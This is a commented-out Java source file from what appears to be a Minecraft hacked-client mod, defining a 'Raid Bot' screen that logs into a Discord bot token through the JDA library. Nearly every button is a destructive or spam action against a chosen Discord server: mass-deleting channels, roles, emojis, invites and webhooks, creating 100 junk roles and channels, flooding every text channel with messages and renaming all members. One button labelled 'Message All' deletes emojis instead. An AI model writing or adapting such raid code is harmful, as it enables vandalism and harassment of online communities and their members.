//package net.shadow.gui;
//
//import net.dv8tion.jda.api.JDA;
//import net.dv8tion.jda.api.JDABuilder;
//import net.dv8tion.jda.api.entities.*;
//import net.dv8tion.jda.api.requests.RestAction;
//import net.minecraft.client.MinecraftClient;
//import net.minecraft.client.gui.DrawableHelper;
//import net.minecraft.client.gui.screen.Screen;
//import net.minecraft.client.gui.widget.ButtonWidget;
//import net.minecraft.client.gui.widget.TextFieldWidget;
//import net.minecraft.client.util.math.MatrixStack;
//import net.minecraft.text.Text;
//import net.shadow.Shadow;
//import net.shadow.font.FontRenderers;
//import net.shadow.plugin.Notification;
//import net.shadow.plugin.NotificationSystem;
//import net.shadow.utils.RenderUtils;
//
//import javax.security.auth.login.LoginException;
//import java.awt.*;
//import java.util.List;
//import java.util.Random;
//
//public class RaidBotGui extends Screen {
//    protected static final MinecraftClient MC = MinecraftClient.getInstance();
//    private static JDA client = null;
//    private static Guild tguild = null;
//    TextFieldWidget token;
//    TextFieldWidget optional;
//
//    protected RaidBotGui(Text title) {
//        super(title);
//    }
//
//    public static void setClientGuild(Guild g) {
//        tguild = g;
//        NotificationSystem.notifications.add(new Notification("Raid Bot", "Recieved discord guild selection!", 150));
//    }
//
//    @Override
//    protected void init() {
//        int w = MC.getWindow().getScaledWidth();
//        int h = MC.getWindow().getScaledHeight();
//        int hh = h / 2;
//        int ww = w / 2;
//        int t = w / 4;
//        int t2 = t * 2;
//        int t3 = t * 3;
//
//        token = new TextFieldWidget(MC.textRenderer, t - 88, hh - 115, 175, 20, Text.of("token"));
//        token.setMaxLength(65535);
//        optional = new TextFieldWidget(MC.textRenderer, t2 - 88, hh - 115, 175, 20, Text.of("optional"));
//        optional.setMaxLength(65535);
//
//        ButtonWidget start = new ButtonWidget(t - 88, hh - 85, 175, 20, Text.of("Start"), button -> {
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Trying to log into the token", 150));
//            new Thread(() -> {
//                try {
//                    client = JDABuilder.createDefault(token.getText()).build();
//                    NotificationSystem.notifications.add(new Notification("Raid Bot", "Logged into the token!", 150));
//                } catch (LoginException e) {
//                    NotificationSystem.notifications.add(new Notification("Raid Bot", "Failed to log into the token!", 150));
//                    return;
//                }
//                client.addEventListener(new DiscordEXTGuildHelper());
//            }).start();
//        });
//
//        ButtonWidget stop = new ButtonWidget(t - 88, hh - 60, 175, 20, Text.of("Stop"), button -> {
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Stopping", 150));
//            new Thread(() -> client.shutdown()).start();
//        });
//
//        ButtonWidget delchannels = new ButtonWidget(t3 - 88, hh - 115, 175, 20, Text.of("Delete Channels"), button -> {
//            if (tguild == null) return;
//            for (GuildChannel channel : tguild.getChannels()) {
//                channel.delete().queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Deleted Channels", 150));
//        });
//
//        ButtonWidget spamroles = new ButtonWidget(ww - 88, hh - 15, 175, 20, Text.of("Spam Roles"), button -> {
//            for (int i = 0; i < 100; i++) {
//                tguild.createRole().setName(optional.getText() + "-" + new Random().nextInt(5000)).queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Spammed Roles", 150));
//        });
//
//        ButtonWidget spamchannels = new ButtonWidget(ww - 88, hh - 90, 175, 20, Text.of("Spam Channels"), button -> {
//            for (int i = 0; i < 100; i++) {
//                tguild.createTextChannel(optional.getText() + "-" + new Random().nextInt(5000)).queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Spammed Channels", 150));
//        });
//
//        ButtonWidget spammessage = new ButtonWidget(ww - 88, hh - 65, 175, 20, Text.of("Spam Pings"), button -> {
//            for (int i = 0; i < 10; i++) {
//                for (TextChannel text : tguild.getTextChannels()) {
//                    text.sendMessage(optional.getText()).queue();
//                }
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Spammed Pings", 150));
//        });
//
//        ButtonWidget delroles = new ButtonWidget(t3 - 88, hh - 90, 175, 20, Text.of("Delete Roles"), button -> {
//            for (Role role : tguild.getRoles()) {
//                role.delete().queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Deleted Roles", 150));
//        });
//
//        ButtonWidget delemojis = new ButtonWidget(t3 - 88, hh - 65, 175, 20, Text.of("Delete Emojis"), button -> {
//            for (Emote emote : tguild.getEmotes()) {
//                emote.delete().queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Deleted Emojis", 150));
//        });
//
//        ButtonWidget delinvs = new ButtonWidget(t3 - 88, hh - 40, 175, 20, Text.of("Delete Invites"), button -> {
//            RestAction<List<Invite>> invs = tguild.retrieveInvites();
//            for (Invite inv : invs.complete()) {
//                inv.delete().queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Deleted Invites", 150));
//        });
//
//        ButtonWidget delwebs = new ButtonWidget(t3 - 88, hh - 15, 175, 20, Text.of("Delete Integrations"), button -> {
//            for (Webhook web : tguild.retrieveWebhooks().complete()) {
//                web.delete().queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Deleted Integrations", 150));
//        });
//
//        ButtonWidget nickall = new ButtonWidget(t2 - 88, hh + 10, 175, 20, Text.of("Nickname All"), button -> {
//            for (Member m : tguild.loadMembers().get()) {
//                m.modifyNickname(optional.getText());
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Nicknamed All", 150));
//        });
//
//        ButtonWidget dmall = new ButtonWidget(t2 - 88, hh - 40, 175, 20, Text.of("Message All"), button -> {
//            for (Emote emote : tguild.getEmotes()) {
//                emote.delete().queue();
//            }
//            NotificationSystem.notifications.add(new Notification("Raid Bot", "Messaged Everyone", 150));
//        });
//
//        this.addDrawableChild(start);
//        this.addDrawableChild(delchannels);
//        this.addDrawableChild(spamroles);
//        this.addDrawableChild(spamchannels);
//        this.addDrawableChild(spammessage);
//        this.addDrawableChild(delroles);
//        this.addDrawableChild(delemojis);
//        this.addDrawableChild(dmall);
//        this.addDrawableChild(stop);
//        this.addDrawableChild(delwebs);
//        this.addDrawableChild(delinvs);
//        this.addDrawableChild(nickall);
//        super.init();
//    }
//
//    @Override
//    public void render(MatrixStack matrices, int mouseX, int mouseY, float delta) {
//        int w = MC.getWindow().getScaledWidth();
//        int h = MC.getWindow().getScaledHeight();
//        int hh = h / 2;
//        int ww = w / 2;
//        int t = w / 4;
//        RenderUtils.renderRoundedQuad(matrices, new Color(50, 50, 50, 255), t - 100, hh - 150, t + 100, hh + 150, 5);
//        RenderUtils.renderRoundedQuad(matrices, new Color(25, 25, 25, 255), t - 100, hh - 150, t + 100, hh - 125, 5);
//        RenderUtils.renderRoundedQuad(matrices, new Color(50, 50, 50, 255), t + t - 100, hh - 150, t + t + 100, hh + 150, 5);
//        RenderUtils.renderRoundedQuad(matrices, new Color(25, 25, 25, 255), t + t - 100, hh - 150, t + t + 100, hh - 125, 5);
//        RenderUtils.renderRoundedQuad(matrices, new Color(50, 50, 50, 255), t + t + t - 100, hh - 150, t + t + t + 100, hh + 150, 5);
//        RenderUtils.renderRoundedQuad(matrices, new Color(25, 25, 25, 255), t + t + t - 100, hh - 150, t + t + t + 100, hh - 125, 5);
//        DrawableHelper.fill(matrices, 0, 0, width, height, new Color(55, 55, 55, 55).getRGB());
//        FontRenderers.getRenderer().drawString(matrices, "Options", t - (FontRenderers.getRenderer().getStringWidth("Options") / 2), hh - 142, 16777215);
//        FontRenderers.getRenderer().drawString(matrices, "Create", t + t - (FontRenderers.getRenderer().getStringWidth("Create") / 2), hh - 142, 16777215);
//        FontRenderers.getRenderer().drawString(matrices, "Destroy", t + t + t - (FontRenderers.getRenderer().getStringWidth("Destroy") / 2), hh - 142, 16777215);
//        token.render(matrices, mouseX, mouseY, delta);
//        optional.render(matrices, mouseX, mouseY, delta);
//        super.render(matrices, mouseX, mouseY, delta);
//    }
//
//    @Override
//    public boolean charTyped(char chr, int keyCode) {
//        token.charTyped(chr, keyCode);
//        optional.charTyped(chr, keyCode);
//        return false;
//    }
//
//    @Override
//    public boolean keyReleased(int keyCode, int scanCode, int modifiers) {
//        token.keyReleased(keyCode, scanCode, modifiers);
//        optional.keyReleased(keyCode, scanCode, modifiers);
//        return false;
//    }
//
//    @Override
//    public boolean keyPressed(int keyCode, int scanCode, int modifiers) {
//        token.keyPressed(keyCode, scanCode, modifiers);
//        optional.keyPressed(keyCode, scanCode, modifiers);
//        return super.keyPressed(keyCode, scanCode, modifiers);
//    }
//
//    @Override
//    public boolean mouseClicked(double mouseX, double mouseY, int button) {
//        token.mouseClicked(mouseX, mouseY, button);
//        optional.mouseClicked(mouseX, mouseY, button);
//        return super.mouseClicked(mouseX, mouseY, button);
//    }
//}
//